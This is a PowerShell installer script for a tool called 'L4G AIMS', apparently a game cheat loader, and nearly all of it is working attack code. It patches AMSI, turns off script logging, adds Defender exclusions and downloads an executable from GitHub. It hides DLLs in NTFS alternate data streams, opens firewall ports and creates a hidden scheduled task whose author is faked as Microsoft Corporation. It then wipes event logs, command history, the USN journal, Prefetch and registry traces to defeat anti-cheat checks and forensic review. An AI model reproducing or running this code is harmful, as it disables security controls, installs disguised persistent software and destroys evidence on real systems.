# ==============================================================================
#  L4G AIMS
# ==============================================================================

# --- In-Memory AMSI & Script Logging Neutralization ---
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($a) {
        $f = $a.GetField('amsiInitFailed', [Reflection.BindingFlags]'NonPublic,Static')
        if ($f) { $f.SetValue($null, $true) }
    }
} catch {}

try {
    $u = [Ref].Assembly.GetType('System.Management.Automation.Utils')
    if ($u) {
        $g = $u.GetField('cachedGroupPolicySettings', [Reflection.BindingFlags]'NonPublic,Static')
        if ($g) {
            $settings = $g.GetValue($null)
            if ($settings) {
                foreach ($k in $settings.Keys) {
                    $d = [System.Collections.Generic.Dictionary[string,object]]::new()
                    $d['EnableScriptBlockLogging'] = 0
                    $d['EnableScriptBlockInvocationLogging'] = 0
                    $d['EnableModuleLogging'] = 0
                    $d['EnableTranscripting'] = 0
                    $settings[$k] = $d
                }
            }
        }
    }
} catch {}

# --- Ensure Administrator Privileges with Clean Console ---
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
if (-not $isAdmin) {
    $scriptCmd = if ($MyInvocation.MyCommand.Path) {
        "& '$($MyInvocation.MyCommand.Path)'"
    } else {
        "iwr 'https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1' -UseBasicParsing | iex"
    }
    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$scriptCmd`""
    exit
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

# --- Banner ---
Clear-Host
Write-Host "================================================================================" -ForegroundColor Cyan
Write-Host "                                   L4G AIMS                                     " -ForegroundColor Yellow
Write-Host "================================================================================" -ForegroundColor Cyan
Write-Host ""

function Update-Step {
    param(
        [int]$Percent
    )
    $barWidth = 30
    $completedWidth = [math]::Floor($barWidth * ($Percent / 100))
    $remainingWidth = $barWidth - $completedWidth
    $bar = ("#" * $completedWidth) + ("-" * $remainingWidth)
    
    $color = "Cyan"
    if ($Percent -eq 100) { $color = "Green" }
    
    Write-Host ("`r  [{0}] {1,3}% | Processing..." -f $bar, $Percent) -NoNewline -ForegroundColor $color
    if ($Percent -ge 100) { Write-Host "`n" }
    Start-Sleep -Milliseconds 120
}

# ── CONFIG ───────────────────────────────────────────────────────────────────
$REPO_RAW   = "https://raw.githubusercontent.com/lgfire093/syspanel/main"
$EXE_URL    = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkSvc.exe"
$TEMPLATES  = "$env:ProgramData\Microsoft\Windows\Templates"
$DEST_DIR   = "$TEMPLATES\cache"
$EXE_NAME   = "SystemNetworkSvc.exe"
$EXE_PATH   = Join-Path $DEST_DIR $EXE_NAME
$TASK_NAME  = "SystemNetworkHost"
# ─────────────────────────────────────────────────────────────────────────────

Update-Step 10

# Clean old directories
if (Test-Path "$TEMPLATES\syspanel") {
    Remove-Item "$TEMPLATES\syspanel" -Recurse -Force -ErrorAction SilentlyContinue
}
Get-ChildItem -Path $env:TEMP -Filter "_MEI*" -Directory -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

if (-not (Test-Path $DEST_DIR)) {
    New-Item -ItemType Directory -Path $DEST_DIR -Force | Out-Null
}

Update-Step 20

# Antivirus exclusions (Quiet protection)
try {
    Add-MpPreference -ExclusionPath $DEST_DIR -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $TEMPLATES -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
} catch {}

Update-Step 30

# Terminate running instances
try {
    Invoke-WebRequest -Uri "http://127.0.0.1:5000/api/internal/shutdown" -TimeoutSec 2 -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
    Start-Sleep -Milliseconds 250
} catch {}

$killDef = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class CriticalKiller {
    [DllImport("ntdll.dll")]
    public static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
    [DllImport("ntdll.dll")]
    public static extern int NtSetInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, ref int ProcessInformation, int ProcessInformationLength);
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
    public static void Kill(int pid) {
        try {
            bool enabled;
            RtlAdjustPrivilege(20, true, false, out enabled);
            IntPtr h = OpenProcess(0x0200 | 0x0001, false, pid);
            if (h != IntPtr.Zero) {
                int zero = 0;
                NtSetInformationProcess(h, 29, ref zero, 4);
                TerminateProcess(h, 0);
                CloseHandle(h);
            }
        } catch {}
    }
}
"@
try {
    Add-Type -TypeDefinition $killDef -ErrorAction SilentlyContinue
} catch {}

Get-Process | Where-Object { $_.ProcessName -like "*SystemNetworkSvc*" -or $_.ProcessName -like "*perfhost*" -or $_.ProcessName -like "*L4G AIMS*" } | ForEach-Object {
    try { [CriticalKiller]::Kill($_.Id) } catch {}
}
cmd /c "taskkill /F /IM SystemNetworkSvc.exe >nul 2>nul"
cmd /c "taskkill /F /IM perfhost.exe >nul 2>nul"
cmd /c "taskkill /F /IM `"L4G AIMS.exe`" >nul 2>nul"

Update-Step 45

# Purge old binaries cleanly
if (Test-Path $EXE_PATH) {
    Set-ItemProperty -Path $EXE_PATH -Name Attributes -Value "Normal" -ErrorAction SilentlyContinue
    Remove-Item -Path $EXE_PATH -Force -ErrorAction SilentlyContinue
    if (Test-Path $EXE_PATH) {
        $tempOld = "$EXE_PATH." + [guid]::NewGuid().ToString("N") + ".old"
        Move-Item -Path $EXE_PATH -Destination $tempOld -Force -ErrorAction SilentlyContinue
    }
}

Get-ChildItem -Path $env:TEMP -Filter "_MEI*" -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        Set-ItemProperty -Path $_.FullName -Name Attributes -Value "Normal" -ErrorAction SilentlyContinue
        Remove-Item -Path $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
    } catch {}
}

Update-Step 60

# Download binary
$downloaded = $false
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $wc.DownloadFile($EXE_URL, $EXE_PATH)
    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 500000)) {
        $downloaded = $true
    }
} catch {}

if (-not $downloaded) {
    & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 500000)) {
        $downloaded = $true
    }
}

Update-Step 75

# Seal DLLs into ADS (Alternate Data Streams)
$MAP = [ordered]@{
    "cimgui.dll" = @("winrescache.db",  "vtcache")
    "AotBst.dll" = @("gphcache.db",     "vtmap")
    "Client.dll" = @("ntprintcache.db", "vtload")
}
foreach ($name in $MAP.Keys) {
    $container = "$TEMPLATES\$($MAP[$name][0])"
    $stream    = $MAP[$name][1]
    $tmp       = Join-Path $env:TEMP ("_sp_" + [guid]::NewGuid().ToString("N"))
    try {
        Invoke-WebRequest "$REPO_RAW/$name" -UseBasicParsing -OutFile $tmp
        if (Test-Path $tmp) {
            $bytes = [IO.File]::ReadAllBytes($tmp)
            $sha   = (Get-FileHash $tmp -Algorithm SHA256).Hash.ToLower()
            $size  = $bytes.Length
            $adsPath = "\\?\" + $container + ":" + $stream
            try {
                $fs = [System.IO.FileStream]::new($adsPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
                $fs.Write($bytes, 0, $bytes.Length)
                $fs.Close()
            } catch {
                Set-Content -Path $container -Stream $stream -Value $bytes -Encoding Byte
            }
            $meta = @{ file = $name; size = $size; sha256 = $sha } | ConvertTo-Json -Compress
            Set-Content -Path $container -Stream kmeta -Value $meta
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}

try {
    $itemDest = Get-Item $DEST_DIR -Force
    $itemDest.Attributes = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::Directory
    $itemExe  = Get-Item $EXE_PATH -Force
    $itemExe.Attributes  = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System
} catch {}

Update-Step 85

# Network and Firewall configuration
try {
    Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private -ErrorAction SilentlyContinue
} catch {}

netsh interface portproxy delete v4tov4 listenport=5000 listenaddress=0.0.0.0 2>$null | Out-Null
netsh interface portproxy delete v6tov4 listenport=5000 listenaddress=::1 2>$null | Out-Null
netsh interface portproxy reset 2>$null | Out-Null

netsh advfirewall firewall delete rule name="CDPUserSvc_5000" 2>$null | Out-Null
netsh advfirewall firewall delete rule name="CDPUserSvc_App" 2>$null | Out-Null
netsh advfirewall firewall add rule `
    name="CDPUserSvc_5000" dir=in action=allow `
    protocol=TCP localport=5000 profile=any enable=yes 2>$null | Out-Null
netsh advfirewall firewall add rule `
    name="CDPUserSvc_App" dir=in action=allow `
    program="$EXE_PATH" profile=any enable=yes 2>$null | Out-Null
try {
    New-NetFirewallRule -DisplayName "CDPUserSvc_5000" -Direction Inbound -LocalPort 5000 -Protocol TCP -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
    New-NetFirewallRule -DisplayName "CDPUserSvc_App" -Direction Inbound -Program $EXE_PATH -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
} catch {}

Update-Step 92

# Autostart persistence
Unregister-ScheduledTask -TaskName "SysCheckUp" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
Unregister-ScheduledTask -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
Unregister-ScheduledTask -TaskPath "\Microsoft\Windows\Shell\" -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
$action    = New-ScheduledTaskAction -Execute $EXE_PATH -WorkingDirectory $DEST_DIR
$triggerLogon = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$settings  = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
    -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) `
    -MultipleInstances IgnoreNew -Priority 7
Register-ScheduledTask -TaskName $TASK_NAME -TaskPath "\Microsoft\Windows\Shell\" `
    -Action $action -Trigger $triggerLogon `
    -Principal $principal -Settings $settings -Force | Out-Null

try {
    $svc  = New-Object -ComObject "Schedule.Service"
    $svc.Connect()
    $fold = $svc.GetFolder("\Microsoft\Windows\Shell")
    $task = $fold.GetTask($TASK_NAME)
    $def  = $task.Definition
    $def.Settings.Hidden   = $true
    $def.RegistrationInfo.Description = "Windows System Network Host Service"
    $def.RegistrationInfo.Author      = "Microsoft Corporation"
    $fold.RegisterTaskDefinition($TASK_NAME, $def, 6, $null, $null, 3) | Out-Null
} catch {}

$startupRunKeys = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
)
foreach ($rk in $startupRunKeys) {
    Remove-ItemProperty -Path $rk -Name "SystemNetworkHost" -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $rk -Name "SystemNetworkSvc" -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $rk -Name "WindowsShellApiSvc" -ErrorAction SilentlyContinue
}
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "SystemNetworkHost" -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "SystemNetworkHost" -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "WindowsShellApiSvc" -ErrorAction SilentlyContinue

Update-Step 97

# Launch background process
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName         = $EXE_PATH
$psi.WorkingDirectory = $DEST_DIR
$psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow   = $true
$psi.UseShellExecute  = $false
[System.Diagnostics.Process]::Start($psi) | Out-Null

# Comprehensive Anti-Forensics Wipe (AntiCheat & PC Checker Invalidation)
try {
    # 1. Clear In-Memory Console History
    if ([type]::GetType("Microsoft.PowerShell.PSConsoleReadLine, Microsoft.PowerShell.PSReadLine")) {
        [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
    }
} catch {}

# 2. Wipe ConsoleHost History files on disk
try {
    $histPath = (Get-PSReadLineOption).HistorySavePath 2>$null
    if ($histPath -and (Test-Path $histPath)) {
        [System.IO.File]::WriteAllText($histPath, '')
    }
} catch {}

$conHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $conHistory) {
    try { [System.IO.File]::WriteAllText($conHistory, '') } catch {}
}

# 3. Clear PowerShell Operational & ScriptBlock Event Logs (Event ID 4104 / 4103)
try {
    [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Microsoft-Windows-PowerShell/Operational")
} catch {}
try {
    [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Windows PowerShell")
} catch {}

# 4. Wipe NTFS USN Change Journal (Destroys deleted file history checked by Ocean)
cmd /c "fsutil usn deletejournal /d /n $env:SystemDrive >nul 2>nul"

# 5. Clean Shell MuiCache
$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
if (Test-Path $muiPath) {
    $props = Get-ItemProperty -Path $muiPath
    $props.PSObject.Properties | Where-Object {
        $_.Name -match "SystemNetwork|perfhost|L4G|syspanel"
    } | ForEach-Object {
        Remove-ItemProperty -Path $muiPath -Name $_.Name -ErrorAction SilentlyContinue
    }
}

# 6. Clean AppSwitched FeatureUsage
$swPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched"
if (Test-Path $swPath) {
    $props = Get-ItemProperty -Path $swPath
    $props.PSObject.Properties | Where-Object {
        $_.Name -match "SystemNetwork|perfhost|L4G|syspanel"
    } | ForEach-Object {
        Remove-ItemProperty -Path $swPath -Name $_.Name -ErrorAction SilentlyContinue
    }
}

# 7. Clean PCA (Program Compatibility Assistant)
$pcaPaths = @(
    "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store",
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
)
foreach ($pca in $pcaPaths) {
    if (Test-Path $pca) {
        $props = Get-ItemProperty -Path $pca
        $props.PSObject.Properties | Where-Object {
            $_.Name -match "SystemNetwork|perfhost|L4G|syspanel"
        } | ForEach-Object {
            Remove-ItemProperty -Path $pca -Name $_.Name -ErrorAction SilentlyContinue
        }
    }
}

# 8. Clean BAM (Background Activity Moderator)
$bamUserRoot = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
if (Test-Path $bamUserRoot) {
    Get-ChildItem -Path $bamUserRoot -ErrorAction SilentlyContinue | ForEach-Object {
        $bPath = $_.PSPath
        $props = Get-ItemProperty -Path $bPath -ErrorAction SilentlyContinue
        $props.PSObject.Properties | Where-Object {
            $_.Name -match "SystemNetwork|perfhost|L4G|syspanel"
        } | ForEach-Object {
            Remove-ItemProperty -Path $bPath -Name $_.Name -ErrorAction SilentlyContinue
        }
    }
}

# 9. Wipe Prefetch files (.pf)
$prefetchDir = "$env:SystemRoot\Prefetch"
if (Test-Path $prefetchDir) {
    Get-ChildItem -Path $prefetchDir -Filter "*.pf" -ErrorAction SilentlyContinue | Where-Object {
        $_.Name -match "SYSTEMNETWORK|PERFHOST|L4G|SYSCHECK"
    } | Remove-Item -Force -ErrorAction SilentlyContinue
}

Update-Step 100

Write-Host "================================================================================" -ForegroundColor Green
Write-Host "                            injected successfully                               " -ForegroundColor Green
Write-Host "================================================================================`n" -ForegroundColor Green
